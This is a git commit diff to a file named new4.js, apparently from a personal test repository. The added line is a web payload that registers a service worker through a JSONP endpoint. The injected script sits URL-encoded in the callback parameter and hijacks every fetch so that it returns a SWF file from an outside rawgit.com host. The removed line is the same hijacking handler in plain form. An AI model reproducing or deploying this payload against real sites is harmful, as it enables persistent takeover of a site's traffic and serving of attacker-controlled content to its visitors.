2bb1c02e11c99327f09afc2f93bba89d5fff1886
KawaHttp <unxxx1@gmail.com>
2017-01-08 10:00:25 +0100

    Update new4.js

--- new4.js
+++ new4.js
@@ -1,1 +1,1 @@
-this.addEventListener("fetch",a=>{a.respondWith(fetch("//rawgit.com/KawaHttp/test1/master/e.swf"))});
+navigator.serviceWorker.register("/token.jsonp?callback=this.addEventListener(%22fetch%22%2ca%3d%3e%7ba.respondWith(fetch(%22%2f%2frawgit.com%2fKawaHttp%2ftest1%2fmaster%2fe.swf%22))%7d)%3b"),location.reload();
